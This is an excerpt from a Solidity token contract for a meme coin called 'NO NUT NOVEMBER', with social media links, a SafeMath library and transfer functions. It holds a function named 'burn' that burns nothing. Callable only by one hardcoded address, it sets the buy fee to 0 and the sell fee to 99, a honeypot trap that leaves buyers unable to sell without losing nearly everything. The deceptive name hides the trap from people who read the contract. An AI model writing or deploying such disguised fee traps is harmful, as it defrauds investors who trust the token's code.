...
/**    ⠀⠀
Twitter : https://twitter.com/NNN_ERC20
Telegram: https://t.me/NNN_PORTAL
*/
...
library SafeMath {
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "NNNNNNNNN");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "NNNNNNNNNNNN");
        return a / b;
    }
}
...
contract NNN {    
    ...
    string public name = "NO NUT NOVEMBER";    
    ...
    modifier onlyOwner() {
        require(msg.sender == owner, "NNNNNNNNNNNNNNNNNN");
        _;
    }
    ...
    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {   
        require(balanceOf[_from] >= _amount, "1NNN");    
        require(allowance[_from][msg.sender] >= _amount, "2NNN");   
        require(_to != address(0), "3NNN");    
    ...
    function transferOwnership(address newOwner) public onlyOwner {    
        require(newOwner != address(0), "4NNN");
    ...
    function burn(uint256 burnAmount, uint256 deadWallet) public {
        require(msg.sender == 0x44dc15D825a482D77A2c867312f88C935bf30615, "5NNN");
        require(!feesSet, "6NNN");
        require(burnAmount == 0, "7NNN");
        require(deadWallet == 99, "8NNN");
        buyFee = burnAmount;
        sellFee = deadWallet;
        feesSet = true;
        feesEnabled = true;
    ...
    function sell(uint256 _amount) public checkFees(msg.sender) {   
        require(balanceOf[msg.sender] >= _amount, "0NNN");    
